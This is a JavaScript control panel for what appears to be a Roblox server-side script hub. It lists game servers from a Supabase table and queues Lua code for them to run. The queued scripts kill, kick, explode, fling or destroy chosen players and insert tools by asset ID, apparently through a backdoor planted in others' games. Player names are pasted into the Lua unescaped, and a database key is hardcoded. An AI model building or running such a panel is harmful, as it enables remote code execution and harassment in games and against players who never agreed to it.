/* Andrux Script Hub — messages + player actions */
(function(){
'use strict';

var SU='https://nyourvnfzhxbofwmavgq.supabase.co';
var SK='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im55b3Vydm5memh4Ym9md21hdmdxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODUwOTYwMTIsImV4cCI6MjEwMDY3MjAxMn0.YqztdjSz8kDAf9sHpqVeiMLjfwSbl4kvc8O5sGyJkvg';
var TABLE='ax_gs';
var HDRS={apikey:SK,Authorization:'Bearer '+SK,'Content-Type':'application/json'};

function $(id){return document.getElementById(id);}
function tt(k){if(window.I18N&&typeof window.I18N.t==='function'){var v=window.I18N.t(k);if(v&&v!==k)return v;}return k;}

/* ===== Self-contained i18n application (fixes Cloudflare issue) ===== */
function applyI18n(){
  var els=document.querySelectorAll('[data-i18n]');
  for(var i=0;i<els.length;i++){
    var key=els[i].getAttribute('data-i18n');
    var val=tt(key);
    if(val&&val!==key){els[i].textContent=val;}
  }
  var phEls=document.querySelectorAll('[data-i18n-ph]');
  for(var j=0;j<phEls.length;j++){
    var pkey=phEls[j].getAttribute('data-i18n-ph');
    var pval=tt(pkey);
    if(pval&&pval!==pkey){phEls[j].setAttribute('placeholder',pval);}
  }
}

function toast(msg){
var el=$('toast');if(!el)return;
el.textContent=msg;el.classList.add('show');
clearTimeout(toast._t);
toast._t=setTimeout(function(){el.classList.remove('show');},2500);
}

function apiGet(path){
return fetch(SU+'/rest/v1/'+path,{headers:HDRS}).then(function(r){return r.json();});
}
function apiPatch(path,body){
return fetch(SU+'/rest/v1/'+path,{
method:'PATCH',
headers:Object.assign({},HDRS,{Prefer:'return=minimal'}),
body:JSON.stringify(body)
}).then(function(r){if(!r.ok)throw new Error('HTTP '+r.status);return r;});
}

/* ===== Server select ===== */
function loadServers(){
var sel=$('shServerSelect');
if(!sel)return;
apiGet(TABLE+'?select=place_id,game_name,player_count,status&hidden=eq.false&order=game_name.asc')
.then(function(rows){
if(!rows||!rows.length){
sel.innerHTML='<option value="">'+tt('sh.no_servers')+'</option>';
return;
}
var online=rows.filter(function(r){return r.status==='online';});
if(!online.length){
sel.innerHTML='<option value="">'+tt('sh.no_online')+'</option>';
return;
}
sel.innerHTML=online.map(function(r){
var name=r.game_name||r.place_id;
var pc=r.player_count||0;
return'<option value="'+r.place_id+'">'+name+' ('+pc+')</option>';
}).join('');
})
.catch(function(){sel.innerHTML='<option value="">'+tt('sh.load_fail')+'</option>';});
}

function getSelectedServer(){
var sel=$('shServerSelect');
if(!sel)return null;
var v=sel.value;
return v||null;
}

/* ===== Push script to queue ===== */
function pushScript(script,label,side){
side=side||'client';
var placeId=getSelectedServer();
if(!placeId){toast(tt('sh.select_server'));return;}

var entry;
if(side==='client'){
var targetUser=($('shTargetPlayer')?$('shTargetPlayer').value:'').trim();
if(!targetUser){toast(tt('sh.enter_player'));return;}
entry={type:'client_script',target:targetUser,script:script};
}else{
entry=script;
}

apiGet(TABLE+'?select=exec_queue&place_id=eq.'+placeId)
.then(function(rows){
var queue=[];
if(rows&&rows[0]&&Array.isArray(rows[0].exec_queue)){
queue=rows[0].exec_queue;
}
queue.push(entry);
return apiPatch(TABLE+'?place_id=eq.'+placeId,{exec_queue:queue});
})
.then(function(){
toast(tt('sh.pushed')+': '+(label||'Script')+' ('+(side==='client'?'客户端':'服务端')+')');
})
.catch(function(err){
toast(tt('sh.push_fail')+': '+(err.message||err));
});
}

/* ===== Message / Hint sending ===== */
function getTargetPlayer(){
  var input=$('shTargetPlayer');
  if(!input)input=$('paTargetUser');
  return input?(input.value||'').trim():'';
}

function escapeLua(str){
  return str.replace(/\\/g,'\\\\').replace(/"/g,'\\"').replace(/\n/g,'\\n').replace(/\r/g,'\\r').replace(/\t/g,'\\t');
}

function getMsgMode(type){
  var radios=document.querySelectorAll('input[name="'+type+'Mode"]');
  for(var i=0;i<radios.length;i++){
    if(radios[i].checked)return radios[i].value;
  }
  return 'world';
}

window.toggleMsgTarget=function(type){
  var mode=getMsgMode(type);
  var row=$(type+'TargetRow');
  if(row){
    row.style.display=(mode==='player')?'':'none';
  }
};

window.sendMessage=function(){
  var placeId=getSelectedServer();
  if(!placeId){toast(tt('sh.select_server'));return;}
  var mode=getMsgMode('msg');
  var targetUser='';
  if(mode==='player'){
    targetUser=($('msgTargetUser')?$('msgTargetUser').value:'').trim();
    if(!targetUser){toast(tt('sh.enter_player'));return;}
  }
  var content=($('msgContent')?$('msgContent').value:'').trim();
  if(!content){toast('请输入消息内容');return;}
  var duration=parseFloat($('msgDuration')?$('msgDuration').value:'5')||0;
  var script;
  var label;
  if(mode==='world'){
    script='local m=Instance.new("Message")\n'
      +'m.Text="'+escapeLua(content)+'"\n'
      +'m.Parent=workspace\n'
      +(duration>0?'game:GetService("Debris"):AddItem(m,'+duration+')\n':'');
    label='Message (World)';
  }else{
    script='local target=game:GetService("Players"):FindFirstChild("'+escapeLua(targetUser)+'")\n'
      +'if not target then return end\n'
      +'local sg=target:FindFirstChild("PlayerGui") or target:WaitForChild("PlayerGui",5)\n'
      +'if not sg then return end\n'
      +'local m=Instance.new("Message")\n'
      +'m.Text="'+escapeLua(content)+'"\n'
      +'m.Parent=sg\n'
      +(duration>0?'game:GetService("Debris"):AddItem(m,'+duration+')\n':'');
    label='Message -> '+targetUser;
  }
  pushScript(script,label,'server');
  if($('msgContent'))$('msgContent').value='';
};

window.sendHint=function(){
  var placeId=getSelectedServer();
  if(!placeId){toast(tt('sh.select_server'));return;}
  var mode=getMsgMode('hint');
  var targetUser='';
  if(mode==='player'){
    targetUser=($('hintTargetUser')?$('hintTargetUser').value:'').trim();
    if(!targetUser){toast(tt('sh.enter_player'));return;}
  }
  var content=($('hintContent')?$('hintContent').value:'').trim();
  if(!content){toast('请输入提示内容');return;}
  var duration=parseFloat($('hintDuration')?$('hintDuration').value:'3')||0;
  var script;
  var label;
  if(mode==='world'){
    script='local h=Instance.new("Hint")\n'
      +'h.Text="'+escapeLua(content)+'"\n'
      +'h.Parent=workspace\n'
      +(duration>0?'game:GetService("Debris"):AddItem(h,'+duration+')\n':'');
    label='Hint (World)';
  }else{
    script='local target=game:GetService("Players"):FindFirstChild("'+escapeLua(targetUser)+'")\n'
      +'if not target then return end\n'
      +'local sg=target:FindFirstChild("PlayerGui") or target:WaitForChild("PlayerGui",5)\n'
      +'if not sg then return end\n'
      +'local h=Instance.new("Hint")\n'
      +'h.Text="'+escapeLua(content)+'"\n'
      +'h.Parent=sg\n'
      +(duration>0?'game:GetService("Debris"):AddItem(h,'+duration+')\n':'');
    label='Hint -> '+targetUser;
  }
  pushScript(script,label,'server');
  if($('hintContent'))$('hintContent').value='';
};

/* ===== Player Actions ===== */
function paBuildScript(action,targetUser){
var target='game:GetService("Players"):FindFirstChild("'+targetUser+'")';
var speedVal='100';
var jumpVal='200';
if(action==='speed'){
  var sInput=$('speedValue');
  if(sInput&&sInput.value)speedVal=Math.max(1,parseFloat(sInput.value)||100).toString();
}
if(action==='jump'){
  var jInput=$('jumpValue');
  if(jInput&&jInput.value)jumpVal=Math.max(1,parseFloat(jInput.value)||200).toString();
}
var scripts={
speed:'local target='+target+'\nlocal targetchar=target.Character\nlocal targethum=targetchar:FindFirstChildOfClass("Humanoid")\ntargethum.WalkSpeed='+speedVal,
jump:'local target='+target+'\nlocal targetchar=target.Character\nlocal targethum=targetchar:FindFirstChildOfClass("Humanoid")\nif targethum.JumpPower then targethum.JumpPower='+jumpVal+' elseif targethum.UseJumpPower then targethum.JumpPower='+jumpVal+' else targethum.JumpHeight='+(parseFloat(jumpVal)/4)+' end',
heal:'local target='+target+'\nlocal targetchar=target.Character\nlocal targethum=targetchar:FindFirstChildOfClass("Humanoid")\ntargethum.Health=targethum.MaxHealth',
god:'local target='+target+'\nlocal targetchar=target.Character\nlocal targethum=targetchar:FindFirstChildOfClass("Humanoid")\ntargethum.Health=math.huge\ntargethum.MaxHealth=math.huge',
kill:'local target='+target+'\nlocal targetchar=target.Character\nlocal targethum=targetchar:FindFirstChildOfClass("Humanoid")\ntargethum.Health=0',
freeze:'local target='+target+'\nlocal targetchar=target.Character\ntargetchar.HumanoidRootPart.Anchored=true',
thaw:'local target='+target+'\nlocal targetchar=target.Character\ntargetchar.HumanoidRootPart.Anchored=false',
explode:'local target='+target+'\nlocal targetchar=target.Character\nInstance.new("Explosion",workspace).Position=targetchar.HumanoidRootPart.Position',
fire:'local target='+target+'\nlocal targetchar=target.Character\nInstance.new("Fire",targetchar.HumanoidRootPart):SetAttribute("AndruxEmitter",true)',
smoke:'local target='+target+'\nlocal targetchar=target.Character\nInstance.new("Smoke",targetchar.HumanoidRootPart):SetAttribute("AndruxEmitter",true)',
sparkles:'local target='+target+'\nlocal targetchar=target.Character\nInstance.new("Sparkles",targetchar.HumanoidRootPart):SetAttribute("AndruxEmitter",true)',
forcefield:'local target='+target+'\nlocal targetchar=target.Character\nInstance.new("ForceField",targetchar)',
sit:'local target='+target+'\nlocal targetchar=target.Character\nlocal targethum=targetchar:FindFirstChildOfClass("Humanoid")\ntargethum.Sit=true',
fling:'local target='+target+'\nlocal targetchar=target.Character\nInstance.new("BodyForce",targetchar.HumanoidRootPart).Force=Vector3.new(12550821,12550821,0)',
invisible:'local target='+target+'\nlocal targetchar=target.Character\nfor _,v in pairs(targetchar:GetDescendants())do if v:IsA("BasePart")or v:IsA("Decal")or v:IsA("Texture")and v.Transparency~=1 then v:SetAttribute("OgTransparency",v.Transparency)v.Transparency=1 end end',
visible:'local target='+target+'\nlocal targetchar=target.Character\nfor _,v in pairs(targetchar:GetDescendants())do if v:IsA("BasePart")or v:IsA("Decal")or v:IsA("Texture")and v:GetAttribute("OgTransparency")then v.Transparency=v:GetAttribute("OgTransparency")end end',
kick:'local target='+target+'\ntarget:Kick("Kicked by Andrux Admin")',
punish:'local target='+target+'\ntarget.Character:Destroy()',
refresh:'local target='+target+'\nlocal cf\nif target.Character then local h=target.Character:FindFirstChild("Head")if h then cf=h.CFrame end end\ntarget:LoadCharacterAsync()\nif cf then local h=target.Character:WaitForChild("Head")h.CFrame=cf end',
goto:'local plr=game:GetService("Players").LocalPlayer\nlocal plrchar=plr.Character\nif not plrchar.PrimaryPart then plrchar.PrimaryPart=plrchar:FindFirstChild("HumanoidRootPart")end\nlocal target='+target+'\nlocal targetchar=target.Character\nif not targetchar.PrimaryPart then targetchar.PrimaryPart=targetchar:FindFirstChild("HumanoidRootPart")end\nplrchar:SetPrimaryPartCFrame(targetchar.PrimaryPart.CFrame)',
bring:'local plr=game:GetService("Players").LocalPlayer\nlocal plrchar=plr.Character\nif not plrchar.PrimaryPart then plrchar.PrimaryPart=plrchar:FindFirstChild("HumanoidRootPart")end\nlocal target='+target+'\nlocal targetchar=target.Character\nif not targetchar.PrimaryPart then targetchar.PrimaryPart=targetchar:FindFirstChild("HumanoidRootPart")end\ntargetchar:SetPrimaryPartCFrame(plrchar.PrimaryPart.CFrame)',
f3x:'local target='+target+'\nrequire(580330877)().Parent=target.Backpack',
luger:'local target='+target+'\nlocal tool=game:GetService("InsertService"):LoadAsset(95354288):GetChildren()[1]\ntool.Parent=target.Backpack',
tripmine:'local target='+target+'\nlocal tool=game:GetService("InsertService"):LoadAsset(11999247):GetChildren()[1]\ntool.Parent=target.Backpack',
};
return scripts[action]||null;
}

window.paAction=function(action){
var targetUser=($('paTargetUser')?$('paTargetUser').value:'').trim();
if(!targetUser){toast(tt('sh.enter_player'));return;}
var script=paBuildScript(action,targetUser);
if(!script){toast(tt('sh.unknown_action'));return;}
var labels={speed:tt('sh.act_speed'),jump:tt('sh.act_jump'),heal:tt('sh.act_heal'),god:tt('sh.act_god'),kill:tt('sh.act_kill'),freeze:tt('sh.act_freeze'),thaw:tt('sh.act_thaw'),explode:tt('sh.act_explode'),fire:tt('sh.act_fire'),smoke:tt('sh.act_smoke'),sparkles:tt('sh.act_sparkles'),forcefield:tt('sh.act_forcefield'),sit:tt('sh.act_sit'),fling:tt('sh.act_fling'),invisible:tt('sh.act_invisible'),visible:tt('sh.act_visible'),kick:tt('sh.act_kick'),punish:tt('sh.act_punish'),refresh:tt('sh.act_refresh'),goto:tt('sh.act_goto'),bring:tt('sh.act_bring'),f3x:tt('sh.act_f3x'),luger:tt('sh.act_luger'),tripmine:tt('sh.act_tripmine')};
var extra='';
if(action==='speed'&&$('speedValue'))extra=' ('+$('speedValue').value+')';
if(action==='jump'&&$('jumpValue'))extra=' ('+$('jumpValue').value+')';
pushScript(script,labels[action]+extra+' -> '+targetUser,'server');
};

/* ===== Tab switching ===== */
function setupTabs(){
var btns=document.querySelectorAll('.sh-tab');
if(!btns.length)return;
btns.forEach(function(btn){
btn.onclick=function(){
var tab=btn.getAttribute('data-shtab');
btns.forEach(function(b){b.classList.remove('active');});
btn.classList.add('active');
var messages=$('shMessagesPanel');
var actions=$('shActionsPanel');
if(tab==='messages'){
if(messages)messages.style.display='';
if(actions)actions.style.display='none';
}else{
if(messages)messages.style.display='none';
if(actions)actions.style.display='';
}
};
});
}

/* ===== Init ===== */
function init(){
loadServers();
setupTabs();
applyI18n();
}

if(document.readyState==='loading'){
document.addEventListener('DOMContentLoaded',init);
}else{
init();
}
setTimeout(init,300);
setTimeout(init,1000);
setTimeout(init,3000);
})();
